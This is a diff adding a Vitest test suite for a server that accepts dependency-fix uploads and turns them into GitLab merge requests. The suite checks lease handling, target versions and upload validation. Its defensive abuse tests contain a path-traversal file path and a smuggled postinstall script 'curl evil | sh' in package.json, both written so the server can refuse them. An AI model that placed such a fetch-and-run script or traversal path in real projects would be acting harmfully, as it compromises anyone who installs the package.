@@ -1,0 +1,839 @@
+import { createHash } from 'node:crypto';
+import { fixResultBodySchema, type FixClaimAnswer, type FixClaimItem } from '@qualor/shared/fix';
+import { and, eq, sql } from 'drizzle-orm';
+import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
+import { bearer } from '../../test/app';
+import { createFakeGitLab, type FakeGitLab } from '../../test/fake-gitlab';
+import { enableFixes, seedFix, seedMainVulnerability } from '../../test/fixes';
+import { createIngestHarness, type IngestHarness, type IngestProject } from '../../test/ingest';
+import { mainBranchId } from '../../test/issues';
+import { mappedProject, scmTestConfig } from '../../test/scm';
+import {
+  dependencyFixes,
+  jobs,
+  projectFixSettings,
+  projects,
+  scmConnections,
+  targetVulnerabilities,
+  type FixState,
+} from '../db/schema';
+import { FIX_QUEUE } from '../fixes/jobs';
+import { acceptFixResult } from '../fixes/result';
+import { ProblemError } from '../http/problem';
+
+const GITLAB_ID = 41;
+const BIG_GITLAB_ID = 43;
+const CVE = 'CVE-2026-9001';
+const NPM = 'https://registry.npmjs.org';
+
+const integrity = (version: string) =>
+  `sha512-${createHash('sha512').update(`qf-a-${version}`).digest('base64')}`;
+
+const packageJson = (range: string, extra = '') =>
+  `{\n  "name": "app",\n  "dependencies": {\n    "qf-a": "${range}"\n  }${extra}\n}\n`;
+
+/** An npm v3 lockfile with qf-a at `version` and `filler` unrelated packages that never change. */
+const packageLock = (version: string, filler = 0) => {
+  const packages: Record<string, object> = {
+    '': { name: 'app', dependencies: { 'qf-a': '^1.2.5' } },
+    'node_modules/qf-a': {
+      version,
+      resolved: `${NPM}/qf-a/-/qf-a-${version}.tgz`,
+      integrity: integrity(version),
+    },
+  };
+  for (let i = 0; i < filler; i++) {
+    const name = `filler-${String(i).padStart(6, '0')}`;
+    packages[`node_modules/${name}`] = {
+      version: '1.0.0',
+      resolved: `${NPM}/${name}/-/${name}-1.0.0.tgz`,
+      integrity: `sha512-${'A'.repeat(86)}==`,
+    };
+  }
+  return `${JSON.stringify({ name: 'app', lockfileVersion: 3, packages }, null, 2)}\n`;
+};
+
+const b64 = (text: string | Buffer) => Buffer.from(text).toString('base64');
+
+interface Answer {
+  statusCode: number;
+  json: () => { code?: string; reason?: string; detail?: string; state?: FixState };
+}
+const problem = (res: Answer) => {
+  const body = res.json();
+  return [res.statusCode, body.code, body.reason ?? null];
+};
+
+describe('the fix job: claim and result (0.16 fix MRs §6.5-§6.7, B1, R4-R8, R16, R31)', () => {
+  let h: IngestHarness;
+  let fake: FakeGitLab;
+  let project: IngestProject & { connectionId: string };
+  let big: IngestProject & { connectionId: string };
+  let other: IngestProject;
+  let projectId: string;
+  let main: string;
+  let token: Record<string, string>;
+  let pkgs = 0;
+
+  const db = () => h.ctx.db;
+  const fresh = () => `qf-pkg-${++pkgs}`;
+  const vulnerable = (
+    packageName: string,
+    over: Partial<Parameters<typeof seedMainVulnerability>[2]> = {},
+    target = { id: projectId, mainBranchId: main },
+  ) =>
+    seedMainVulnerability(db(), target, {
+      ecosystem: 'npm',
+      packageName,
+      version: '1.2.5',
+      vulnerabilityId: CVE,
+      severity: 'high',
+      fixedVersion: '1.2.6, 0.2.4',
+      ...over,
+    });
+  const claim = (body: object, headers = token, key = project.key) =>
+    h.ctx.app.inject({
+      method: 'POST',
+      url: `/api/v0/projects/fixes/claim?projectKey=${encodeURIComponent(key)}`,
+      headers,
+      payload: { families: ['js'], branch: 'main', ...body },
+    });
+  const claimed = async (body: object = {}, headers = token, key = project.key) => {
+    const res = await claim(body, headers, key);
+    expect(res.statusCode, res.body).toBe(200);
+    return res.json() as FixClaimAnswer;
+  };
+  /** A requested fix of qf-a, claimed alone; earlier rows of qf-a go first. */
+  const claimQfA = async (seed: Partial<Parameters<typeof seedFix>[1]> = {}) => {
+    await db()
+      .delete(dependencyFixes)
+      .where(
+        and(eq(dependencyFixes.projectId, projectId), eq(dependencyFixes.packageName, 'qf-a')),
+      );
+    await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a', ...seed });
+    const answer = await claimed({ max: 1 });
+    expect(answer.items).toHaveLength(1);
+    return answer.items[0]!;
+  };
+  const result = (fixId: string, body: object, headers = token) =>
+    h.ctx.app.inject({
+      method: 'PUT',
+      url: `/api/v0/fixes/${fixId}/result`,
+      headers,
+      payload: body,
+    });
+  const head = (id = GITLAB_ID) => fake.headOf(id, 'main')!;
+  /** The good upload of qf-a 1.2.5 → 1.2.6 on main's head. */
+  const upload = (item: FixClaimItem, over: Record<string, unknown> = {}) => ({
+    generation: item.generation,
+    leaseToken: item.leaseToken,
+    baseSha: head(),
+    installedVersion: '1.2.5',
+    targetVersion: '1.2.6',
+    targets: [{ installed: '1.2.5', target: '1.2.6', lockfile: 'package-lock.json' }],
+    files: [
+      { path: 'package.json', content: b64(packageJson('^1.2.6')) },
+      { path: 'package-lock.json', content: b64(packageLock('1.2.6')) },
+    ],
+    lockfiles: [{ path: 'package-lock.json', relation: 'direct', mechanism: null, dependents: [] }],
+    unfixable: [],
+    ...over,
+  });
+  const row = async (id: string) =>
+    (await db().select().from(dependencyFixes).where(eq(dependencyFixes.id, id)))[0]!;
+  const fixJobs = () =>
+    db()
+      .select()
+      .from(jobs)
+      .where(and(eq(jobs.queue, FIX_QUEUE), sql`${jobs.concurrencyKey} LIKE 'fix:%'`));
+  /** Whatever the fake was asked to change: nothing, for any refused or failed upload. */
+  const writes = () => fake.requests.filter((r) => r.method !== 'GET');
+  const refused = async (item: FixClaimItem, res: Answer, rule: string) => {
+    expect(problem(res), JSON.stringify(res.json())).toEqual([422, 'UPLOAD_REFUSED', rule]);
+    expect(await row(item.id)).toMatchObject({
+      state: 'failed',
+      failure: { code: 'upload_refused' },
+      leaseTokenHash: null,
+      prepared: null,
+    });
+    expect(await fixJobs()).toEqual([]);
+    expect(writes()).toEqual([]);
+  };
+
+  beforeAll(async () => {
+    fake = await createFakeGitLab();
+    fake.addProject({ id: GITLAB_ID, path: 'acme/fixes/jobs' });
+    fake.addFile(GITLAB_ID, 'main', 'package.json', packageJson('^1.2.5'));
+    fake.addFile(GITLAB_ID, 'main', 'package-lock.json', packageLock('1.2.5'));
+    fake.addProject({ id: BIG_GITLAB_ID, path: 'acme/fixes/big' });
+    fake.addFile(BIG_GITLAB_ID, 'main', 'package.json', packageJson('^1.2.5'));
+    fake.addFile(BIG_GITLAB_ID, 'main', 'package-lock.json', packageLock('1.2.5', 52_000));
+    h = await createIngestHarness({ config: scmTestConfig(fake) });
+    project = await mappedProject(h, fake, 'FJ', GITLAB_ID, { ownConnection: true });
+    projectId = project.id;
+    token = bearer(project.token);
+    big = await mappedProject(h, fake, 'FJ-BIG', BIG_GITLAB_ID, {
+      connectionId: project.connectionId,
+    });
+    other = await h.project('FJ-OTHER');
+    main = await mainBranchId(db(), projectId);
+    await vulnerable('qf-a');
+  });
+  afterAll(async () => {
+    await h.close();
+    await fake.close();
+  });
+  beforeEach(async () => {
+    await enableFixes(h, projectId, { maxOpen: 20 });
+    fake.clearRequests();
+  });
+  afterEach(async () => {
+    await db().delete(dependencyFixes);
+    await db().delete(jobs).where(eq(jobs.queue, FIX_QUEUE));
+  });
+
+  it('project tokens only (B1): a personal token with analysis:write and a session get 403', async () => {
+    const pat = await h.ctx.app.inject({
+      method: 'POST',
+      url: '/api/v0/tokens',
+      headers: h.orgAdmin.headers,
+      payload: { name: 'fix-pat', scopes: ['analysis:write'] },
+    });
+    const personal = bearer((pat.json() as { token: string }).token);
+    const fixId = await seedFix(db(), {
+      projectId,
+      family: 'js',
+      packageName: 'qf-a',
+      state: 'preparing',
+    });
+    const body = { generation: 1, leaseToken: 'x', released: true };
+    for (const headers of [personal, h.orgAdmin.headers]) {
+      expect(problem(await claim({}, headers))).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
+      expect(problem(await result(fixId, body, headers))).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
+    }
+    expect((await row(fixId)).state).toBe('preparing');
+    // And the project token is refused everywhere else, with the new text.
+    const elsewhere = await h.ctx.app.inject({
+      method: 'GET',
+      url: `/api/v0/projects/${projectId}/fixes`,
+      headers: token,
+    });
+    expect(problem(elsewhere)).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
+    expect((elsewhere.json() as { title: string }).title).toContain(
+      "claim and upload their project's fixes",
+    );
+  });
+
+  it('claim: oldest first, preparing with a 30-minute lease and the handled vulnerabilities (R4, R5)', async () => {
+    const [b, c] = [fresh(), fresh()];
+    await vulnerable(b, { vulnerabilityId: 'GHSA-b', version: '2.0.0', fixedVersion: '2.0.1' });
+    await vulnerable(b, {
+      vulnerabilityId: 'GHSA-b',
+      version: '1.4.0',
+      fixedVersion: '2.0.1, 1.4.2',
+    });
+    await vulnerable(c);
+    const at = (minutes: number) => new Date(Date.now() - minutes * 60_000);
+    const first = await seedFix(db(), {
+      projectId,
+      family: 'js',
+      packageName: b,
+      updatedAt: at(30),
+    });
+    const second = await seedFix(db(), {
+      projectId,
+      family: 'js',
+      packageName: 'qf-a',
+      updatedAt: at(20),
+    });
+    const third = await seedFix(db(), {
+      projectId,
+      family: 'js',
+      packageName: c,
+      state: 'open',
+      refresh: true,
+      updatedAt: at(10),
+    });
+    // An open MR without refresh and a fix of another family are not claimable.
+    await seedFix(db(), { projectId, family: 'js', packageName: fresh(), state: 'open' });
+    await seedFix(db(), { projectId, family: 'go', packageName: 'example.com/qf' });
+    await db()
+      .update(projectFixSettings)
+      .set({ lastClaimAt: null })
+      .where(eq(projectFixSettings.projectId, projectId));
+
+    expect(await claimed({ families: ['maven'] })).toEqual({ items: [], reason: null });
+    const before = Date.now();
+    const answer = await claimed({ max: 10, revision: 'a'.repeat(40) });
+    expect(answer.reason).toBeNull();
+    expect(answer.items.map((i) => i.id)).toEqual([first, second, third]);
+    expect(answer.items[0]).toEqual<FixClaimItem>({
+      id: first,
+      generation: 1,
+      leaseToken: expect.stringMatching(/^[\w-]{43}$/),
+      family: 'js',
+      packageName: b,
+      installedVersions: ['1.4.0', '2.0.0'],
+      vulnerabilities: [
+        {
+          id: 'GHSA-b',
+          severity: 'high',
+          title: null,
+          url: null,
+          installedVersions: ['1.4.0', '2.0.0'],
+          fixedVersions: ['2.0.1', '1.4.2'],
+        },
+      ],
+      mainBranch: 'main',
+      declinedTarget: null,
+    });
+    // R5: Trivy's comma list, split.
+    expect(answer.items[1]!.vulnerabilities).toEqual([
+      expect.objectContaining({
+        id: CVE,
+        installedVersions: ['1.2.5'],
+        fixedVersions: ['1.2.6', '0.2.4'],
+      }),
+    ]);
+    for (const item of answer.items) {
+      const stored = await row(item.id);
+      expect(stored.state).toBe('preparing');
+      expect(stored.leaseTokenHash).toBe(
+        createHash('sha256').update(item.leaseToken).digest('hex'),
+      );
+      const lease = stored.leaseUntil!.getTime() - before;
+      expect(lease).toBeGreaterThan(29 * 60_000);
+      expect(lease).toBeLessThan(31 * 60_000);
+      expect(stored.vulnerabilityIds.length).toBeGreaterThan(0);
+    }
+    expect((await row(first)).vulnerabilityIds).toEqual(['GHSA-b']);
+    expect(new Set(answer.items.map((i) => i.leaseToken)).size).toBe(3);
+    // Nothing left of the js family.
+    expect(await claimed({})).toEqual({ items: [], reason: null });
+    const [settings] = await db()
+      .select()
+      .from(projectFixSettings)
+      .where(eq(projectFixSettings.projectId, projectId));
+    expect(settings!.lastClaimAt).not.toBeNull();
+  });
+
+  it('reasons (R4): a switched-off project answers its reason; another branch is 409 NOT_MAIN_BRANCH', async () => {
+    const fixId = await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a' });
+    await enableFixes(h, projectId, { enabled: false });
+    await db()
+      .update(projectFixSettings)
+      .set({ lastClaimAt: null })
+      .where(eq(projectFixSettings.projectId, projectId));
+    expect(await claimed({})).toEqual({ items: [], reason: 'disabled' });
+    const [off] = await db()
+      .select()
+      .from(projectFixSettings)
+      .where(eq(projectFixSettings.projectId, projectId));
+    expect(off!.lastClaimAt).toBeNull();
+
+    await enableFixes(h, projectId);
+    await db()
+      .update(scmConnections)
+      .set({ fixMrsAllowed: false })
+      .where(eq(scmConnections.id, project.connectionId));
+    expect(await claimed({})).toEqual({ items: [], reason: 'not_allowed' });
+    await enableFixes(h, projectId);
+    expect(problem(await claim({ branch: 'feature/x' }))).toEqual([409, 'NOT_MAIN_BRANCH', null]);
+    expect((await row(fixId)).state).toBe('requested');
+    // Another project's key with this project's token.
+    expect(problem(await claim({}, token, other.key))).toEqual([404, 'PROJECT_NOT_FOUND', null]);
+  });
+
+  it('nothing left (R31): a fix whose main rows are gone is fixed, one without a fixed version no_fix', async () => {
+    const gone = await seedFix(db(), { projectId, family: 'js', packageName: fresh() });
+    const noFixed = fresh();
+    await vulnerable(noFixed, { fixedVersion: null });
+    const unfixable = await seedFix(db(), { projectId, family: 'js', packageName: noFixed });
+    // With an MR (R8): a gone package stays for the pass, one without a fixed version stays open.
+    const goneWithMr = await seedFix(db(), {
+      projectId,
+      family: 'js',
+      packageName: fresh(),
+      state: 'open',
+      refresh: true,
+    });
+    const noFixedMr = fresh();
+    await vulnerable(noFixedMr, { fixedVersion: null });
+    const unfixableWithMr = await seedFix(db(), {
+      projectId,
+      family: 'js',
+      packageName: noFixedMr,
+      state: 'open',
+      refresh: true,
+    });
+    const handed = await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a' });
+
+    const answer = await claimed({ max: 10 });
+    expect(answer.items.map((i) => i.id)).toEqual([handed]);
+    expect(await row(gone)).toMatchObject({ state: 'fixed', failure: null });
+    expect(await row(unfixable)).toMatchObject({
+      state: 'no_fix',
+      failure: { code: 'no_fixed_version' },
+    });
+    expect(await row(goneWithMr)).toMatchObject({ state: 'open', refresh: true, failure: null });
+    expect(await row(unfixableWithMr)).toMatchObject({
+      state: 'open',
+      refresh: false,
+      failure: { code: 'no_fixed_version' },
+    });
+  });
+
+  it('two claims at once (Review Focus 4): one fix is handed out once, no claim takes more than max', async () => {
+    await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a' });
+    const answers = await Promise.all([claimed({ max: 1 }), claimed({ max: 1 })]);
+    for (const answer of answers) expect(answer.items.length).toBeLessThanOrEqual(1);
+    expect(answers.flatMap((a) => a.items)).toHaveLength(1);
+
+    // Three fixes, five claims of one at a time: each fix once.
+    await db().delete(dependencyFixes);
+    const names = [fresh(), fresh(), fresh()];
+    for (const name of names) await vulnerable(name);
+    const ids = [];
+    for (const name of names)
+      ids.push(await seedFix(db(), { projectId, family: 'js', packageName: name }));
+    const many = await Promise.all(Array.from({ length: 5 }, () => claimed({ max: 1 })));
+    for (const answer of many) expect(answer.items.length).toBeLessThanOrEqual(1);
+    expect(many.flatMap((a) => a.items.map((i) => i.id)).toSorted()).toEqual(ids.toSorted());
+  });
+
+  it('accepts an upload: committing, the files kept with their new entries, one commit job', async () => {
+    const item = await claimQfA();
+    const res = await result(item.id, upload(item));
+    expect(res.statusCode, res.body).toBe(202);
+    expect(res.json()).toEqual({ state: 'committing' });
+    const stored = await row(item.id);
+    expect(stored).toMatchObject({
+      state: 'committing',
+      baseSha: head(),
+      targets: [{ installed: '1.2.5', target: '1.2.6', lockfile: 'package-lock.json' }],
+      targetVersion: '1.2.6',
+      installedVersion: '1.2.5',
+      leaseTokenHash: null,
+      leaseUntil: null,
+      failure: null,
+    });
+    expect(stored.prepared).toEqual({
+      baseSha: head(),
+      files: [
+        { path: 'package.json', content: packageJson('^1.2.6') },
+        { path: 'package-lock.json', content: packageLock('1.2.6') },
+      ],
+      lockfiles: [
+        { path: 'package-lock.json', relation: 'direct', mechanism: null, dependents: [] },
+      ],
+      unfixable: [],
+      additions: [
+        { path: 'package-lock.json', entries: [{ slot: null, name: 'qf-a', version: '1.2.6' }] },
+      ],
+    });
+    const queued = await fixJobs();
+    expect(queued.map((j) => [j.status, j.concurrencyKey, j.payload])).toEqual([
+      [
+        'queued',
+        `fix:${item.id}`,
+        { kind: 'commit', fixId: item.id, generation: item.generation, attempt: 0 },
+      ],
+    ]);
+    expect(writes()).toEqual([]);
+    // The lease is spent: the same upload again is 409.
+    expect(problem(await result(item.id, upload(item)))).toEqual([409, 'FIX_LEASE_LOST', null]);
+  });
+
+  it('keeps CRLF line ends and a UTF-8 byte order mark as uploaded (Review Focus 1)', async () => {
+    const crlf = (text: string) => `\uFEFF${text.replaceAll('\n', '\r\n')}`;
+    fake.addFile(GITLAB_ID, 'main', 'package.json', crlf(packageJson('^1.2.5')));
+    try {
+      const item = await claimQfA();
+      const res = await result(
+        item.id,
+        upload(item, {
+          files: [
+            { path: 'package.json', content: b64(crlf(packageJson('^1.2.6'))) },
+            { path: 'package-lock.json', content: b64(packageLock('1.2.6')) },
+          ],
+        }),
+      );
+      expect(res.statusCode, res.body).toBe(202);
+      expect((await row(item.id)).prepared!.files[0]!.content).toBe(crlf(packageJson('^1.2.6')));
+    } finally {
+      fake.addFile(GITLAB_ID, 'main', 'package.json', packageJson('^1.2.5'));
+    }
+  });
+
+  it('upload abuse (spec §11.1): each refused by its rule, the fix failed, nothing queued or written', async () => {
+    const cases: [string, (item: FixClaimItem) => object][] = [
+      [
+        'path_not_allowed',
+        (item) =>
+          upload(item, {
+            files: [{ path: '../.github/workflows/x.yml', content: b64('on: push\n') }],
+          }),
+      ],
+      [
+        'new_file',
+        (item) =>
+          upload(item, {
+            files: [
+              ...upload(item).files,
+              { path: 'yarn.lock', content: b64('# yarn lockfile v1\n') },
+            ],
+          }),
+      ],
+      [
+        'too_many_files',
+        (item) =>
+          upload(item, {
+            files: Array.from({ length: 51 }, (_, i) => ({
+              path: `p${i}/package.json`,
+              content: b64('{}\n'),
+            })),
+          }),
+      ],
+      [
+        'too_large',
+        (item) =>
+          upload(item, {
+            files: [
+              { path: 'package-lock.json', content: b64(Buffer.alloc(33 * 1024 * 1024, 97)) },
+            ],
+          }),
+      ],
+      [
+        'not_utf8',
+        (item) =>
+          upload(item, {
+            files: [{ path: 'package.json', content: b64(Buffer.from([0x7b, 0xff, 0xfe, 0x7d])) }],
+          }),
+      ],
+      [
+        'duplicate_path',
+        (item) => upload(item, { files: [...upload(item).files, upload(item).files[0]] }),
+      ],
+      ['base_not_on_main', (item) => upload(item, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) })],
+    ];
+    for (const [rule, body] of cases) {
+      const item = await claimQfA();
+      fake.clearRequests();
+      const res = await result(item.id, body(item));
+      await refused(item, res, rule);
+      expect(res.json().detail ?? null, rule).toEqual(
+        rule === 'base_not_on_main' ? null : expect.any(String),
+      );
+    }
+    // A random sha is no commit of the repository either.
+    const item = await claimQfA();
+    await refused(
+      item,
+      await result(item.id, upload(item, { baseSha: 'f'.repeat(40) })),
+      'base_not_on_main',
+    );
+  });
+
+  it('smuggling end to end (spec §11.8): an allowlisted package.json adding postinstall is other_change', async () => {
+    const item = await claimQfA();
+    const res = await result(
+      item.id,
+      upload(item, {
+        files: [
+          {
+            path: 'package.json',
+            content: b64(
+              packageJson('^1.2.6', ',\n  "scripts": { "postinstall": "curl evil | sh" }'),
+            ),
+          },
+          { path: 'package-lock.json', content: b64(packageLock('1.2.6')) },
+        ],
+      }),
+    );
+    await refused(item, res, 'other_change');
+    expect(res.json().detail).toBe('package.json');
+    expect((await row(item.id)).failure!.message).toBe(
+      "The change touches more than the package's version and its pin. File: package.json",
+    );
+  });
+
+  it('targets (R7): below the server choice, an installed version main lacks, a wrong targetVersion', async () => {
+    const cases: [string, Record<string, unknown>][] = [
+      [
+        'below_target',
+        {
+          targetVersion: '1.2.5',
+          targets: [{ installed: '1.2.5', target: '1.2.5', lockfile: 'package-lock.json' }],
+        },
+      ],
+      [
+        'not_vulnerable',
+        {
+          installedVersion: '1.0.0',
+          targets: [{ installed: '1.0.0', target: '1.2.6', lockfile: 'package-lock.json' }],
+        },
+      ],
+      ['target_mismatch', { targetVersion: '1.2.7' }],
+      [
+        'target_mismatch',
+        {
+          targets: [
+            { installed: '1.2.5', target: '1.2.6', lockfile: 'apps/web/package-lock.json' },
+          ],
+        },
+      ],
+      ['no_targets', { targets: [] }],
+    ];
+    for (const [rule, over] of cases) {
+      const item = await claimQfA();
+      fake.clearRequests();
+      await refused(item, await result(item.id, upload(item, over)), rule);
+      // The targets are checked before the SCM is read.
+      expect(fake.requests).toEqual([]);
+    }
+  });
+
+  it('the base must be current main (ruling T3h): a lockfile main changed since is base_outdated', async () => {
+    const item = await claimQfA();
+    const base = head();
+    fake.addFile(
+      GITLAB_ID,
+      'main',
+      'package-lock.json',
+      packageLock('1.2.5').replace('"app"', '"app2"'),
+    );
+    try {
+      await refused(item, await result(item.id, upload(item, { baseSha: base })), 'base_outdated');
+    } finally {
+      fake.addFile(GITLAB_ID, 'main', 'package-lock.json', packageLock('1.2.5'));
+    }
+    // An unrelated file changed on main since the base: accepted.
+    const next = await claimQfA();
+    const older = head();
+    fake.addFile(GITLAB_ID, 'main', 'README.md', '# app\n');
+    expect(older).not.toBe(head());
+    const res = await result(next.id, upload(next, { baseSha: older }));
+    expect(res.statusCode, res.body).toBe(202);
+    expect(await row(next.id)).toMatchObject({ state: 'committing', baseSha: older });
+  });
+
+  it('stale: another lease token is 409 and changes nothing; another project fix is 404', async () => {
+    const item = await claimQfA();
+    const before = await row(item.id);
+    fake.clearRequests();
+    expect(
+      problem(await result(item.id, upload(item, { leaseToken: `${item.leaseToken.slice(1)}x` }))),
+    ).toEqual([409, 'FIX_LEASE_LOST', null]);
+    expect(
+      problem(await result(item.id, upload(item, { generation: item.generation + 1 }))),
+    ).toEqual([409, 'FIX_LEASE_LOST', null]);
+    expect(await row(item.id)).toEqual(before);
+    // The lease is checked before anything else: the repository was not even read.
+    expect(fake.requests).toEqual([]);
+    const foreign = await seedFix(db(), {
+      projectId: other.id,
+      family: 'js',
+      packageName: 'qf-a',
+      state: 'preparing',
+    });
+    const res = await result(foreign, upload(item));
+    expect(problem(res)).toEqual([404, 'NOT_FOUND', null]);
+    expect((res.json() as { title: string }).title).toBe('Fix not found');
+    expect((await row(foreign)).state).toBe('preparing');
+    expect(writes()).toEqual([]);
+  });
+
+  it('expired lease (Review Focus 4): an upload after lease_until is 409 and changes nothing', async () => {
+    const item = await claimQfA();
+    await db()
+      .update(dependencyFixes)
+      .set({ leaseUntil: sql`now() - interval '1 minute'` })
+      .where(eq(dependencyFixes.id, item.id));
+    expect(problem(await result(item.id, upload(item)))).toEqual([409, 'FIX_LEASE_LOST', null]);
+    expect((await row(item.id)).state).toBe('preparing');
+    expect(await fixJobs()).toEqual([]);
+  });
+
+  it('a refused upload of a fix with an MR keeps it open with the failure shown (R8, ruling F7)', async () => {
+    const item = await claimQfA({ state: 'open', refresh: true });
+    const res = await result(
+      item.id,
+      upload(item, { files: [{ path: 'README.md', content: b64('x') }] }),
+    );
+    expect(problem(res)).toEqual([422, 'UPLOAD_REFUSED', 'path_not_allowed']);
+    expect(await row(item.id)).toMatchObject({
+      state: 'open',
+      refresh: false,
+      mrNumber: 12,
+      failure: { code: 'upload_refused' },
+      leaseTokenHash: null,
+    });
+    expect(await fixJobs()).toEqual([]);
+  });
+
+  it('failure is scrubbed (B9): no token, at most 2 KiB, failed', async () => {
+    const item = await claimQfA();
+    // Assembled at run time, so the repository's own Gitleaks pass finds no secret here.
+    const secret = ['npm', 'S3CR3T', 'value', '0123456789'].join('_');
+    const start = 'npm ERR! code E404\n';
+    const end = `\nnpm ERR! 404\n//r.example/:_authToken=${secret}\nfailed at the end\n`;
+    // Ruling F9: 8 000 characters, under the schema's 8 192.
+    const message = `${start}${'x'.repeat(8000 - start.length - end.length)}${end}`;
+    expect(message.length).toBe(8000);
+    const res = await result(item.id, {
+      generation: item.generation,
+      leaseToken: item.leaseToken,
+      failure: { code: 'package_manager', message },
+    });
+    expect(res.statusCode, res.body).toBe(202);
+    expect(res.json()).toEqual({ state: 'failed' });
+    const stored = await row(item.id);
+    expect(stored.state).toBe('failed');
+    expect(stored.failure!.code).toBe('package_manager');
+    expect(stored.failure!.message).not.toContain(secret);
+    expect(stored.failure!.message).toContain(
+      '//r.example/:_authToken=[redacted]\nfailed at the end',
+    );
+    expect(Buffer.byteLength(stored.failure!.message)).toBeLessThanOrEqual(2048);
+    expect(stored.leaseTokenHash).toBeNull();
+    expect(writes()).toEqual([]);
+  });
+
+  it('noFix and released (R8): no_fix; a release is requested again, or open with refresh', async () => {
+    let item = await claimQfA();
+    let res = await result(item.id, {
+      generation: item.generation,
+      leaseToken: item.leaseToken,
+      noFix: { reason: 'declined', message: 'The target 1.2.6 was declined' },
+    });
+    expect([res.statusCode, res.json()]).toEqual([202, { state: 'no_fix' }]);
+    expect(await row(item.id)).toMatchObject({
+      state: 'no_fix',
+      failure: { code: 'declined', message: 'The target 1.2.6 was declined' },
+      leaseTokenHash: null,
+    });
+
+    item = await claimQfA();
+    res = await result(item.id, {
+      generation: item.generation,
+      leaseToken: item.leaseToken,
+      released: true,
+    });
+    expect([res.statusCode, res.json()]).toEqual([202, { state: 'requested' }]);
+    expect(await row(item.id)).toMatchObject({
+      state: 'requested',
+      generation: item.generation + 1,
+      leaseTokenHash: null,
+      leaseUntil: null,
+    });
+
+    item = await claimQfA({ state: 'open', refresh: true });
+    res = await result(item.id, {
+      generation: item.generation,
+      leaseToken: item.leaseToken,
+      released: true,
+    });
+    expect([res.statusCode, res.json()]).toEqual([202, { state: 'open' }]);
+    expect(await row(item.id)).toMatchObject({
+      state: 'open',
+      refresh: true,
+      generation: item.generation + 1,
+      mrNumber: 12,
+    });
+    expect(await fixJobs()).toEqual([]);
+  });
+
+  it('SCM down (R16): merge_base answers 503, so the upload is 503 and the fix stays preparing', async () => {
+    const item = await claimQfA();
+    fake.inject('GET', /\/merge_base$/, { status: 503, body: { message: 'down' } });
+    const res = await result(
+      item.id,
+      upload(item, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) }),
+    );
+    expect(problem(res)).toEqual([503, 'SCM_UNAVAILABLE', null]);
+    expect(res.headers['retry-after']).toBe('10');
+    expect(await row(item.id)).toMatchObject({ state: 'preparing', failure: null });
+    expect(await fixJobs()).toEqual([]);
+  });
+
+  it('a project unbound or a connection no longer allowed meanwhile: 409, the fix stays preparing', async () => {
+    const item = await claimQfA();
+    await db()
+      .update(scmConnections)
+      .set({ fixMrsAllowed: false })
+      .where(eq(scmConnections.id, project.connectionId));
+    expect(problem(await result(item.id, upload(item)))).toEqual([
+      409,
+      'FIX_MRS_NOT_ALLOWED',
+      null,
+    ]);
+    expect((await row(item.id)).state).toBe('preparing');
+    expect(fake.requests).toEqual([]);
+  });
+
+  it('a tiny time cap refuses the upload as unparsable on its largest file (ruling T3k)', async () => {
+    const item = await claimQfA();
+    const fix = await row(item.id);
+    const scm = { secretKey: h.ctx.config.secretKey, internalHosts: h.ctx.config.scmInternalHosts };
+    const [projectOf] = await db().select().from(projects).where(eq(projects.id, projectId));
+    const warned: unknown[] = [];
+    const attempt = acceptFixResult(
+      { db: db(), scm },
+      fix,
+      projectOf!,
+      fixResultBodySchema.parse(upload(item)),
+      { check: { timeoutMs: 1 }, log: { warn: (fields) => void warned.push(fields) } },
+    );
+    await expect(attempt).rejects.toBeInstanceOf(ProblemError);
+    const error = (await attempt.catch((e: unknown) => e)) as ProblemError;
+    expect([error.status, error.code, error.extensions.reason, error.detail]).toEqual([
+      422,
+      'UPLOAD_REFUSED',
+      'unparsable',
+      'package-lock.json',
+    ]);
+    expect(warned).toEqual([{ fixId: item.id, gaveUp: 'timeout' }]);
+    expect(await row(item.id)).toMatchObject({
+      state: 'failed',
+      failure: {
+        code: 'upload_refused',
+        message: 'A changed file cannot be read in its format. File: package-lock.json',
+      },
+    });
+    expect(await fixJobs()).toEqual([]);
+  });
+
+  it('9 MiB base (Review Focus 2): a large package-lock.json on main and its upload are accepted', async () => {
+    const bigMain = await mainBranchId(db(), big.id);
+    await enableFixes(h, big.id);
+    await vulnerable('qf-a', {}, { id: big.id, mainBranchId: bigMain });
+    await seedFix(db(), { projectId: big.id, family: 'js', packageName: 'qf-a' });
+    const answer = await claimed({ max: 1 }, bearer(big.token), big.key);
+    const item = answer.items[0]!;
+    const lock = packageLock('1.2.6', 52_000);
+    expect(Buffer.byteLength(lock)).toBeGreaterThan(9 * 1024 * 1024);
+    const res = await result(
+      item.id,
+      upload(item, {
+        baseSha: head(BIG_GITLAB_ID),
+        files: [
+          { path: 'package.json', content: b64(packageJson('^1.2.6')) },
+          { path: 'package-lock.json', content: b64(lock) },
+        ],
+      }),
+      bearer(big.token),
+    );
+    expect(res.statusCode, res.body).toBe(202);
+    const stored = await row(item.id);
+    expect(stored.state).toBe('committing');
+    expect(stored.prepared!.files[1]!.content).toBe(lock);
+    expect(stored.prepared!.additions).toEqual([
+      { path: 'package-lock.json', entries: [{ slot: null, name: 'qf-a', version: '1.2.6' }] },
+    ]);
+    // The base was read raw from the fake, whole.
+    expect(
+      fake.requests.some((r) => r.path.includes('package-lock.json') && r.path.endsWith('/raw')),
+    ).toBe(true);
+    await db().delete(targetVulnerabilities).where(eq(targetVulnerabilities.projectId, big.id));
+  }, 120_000);
+});
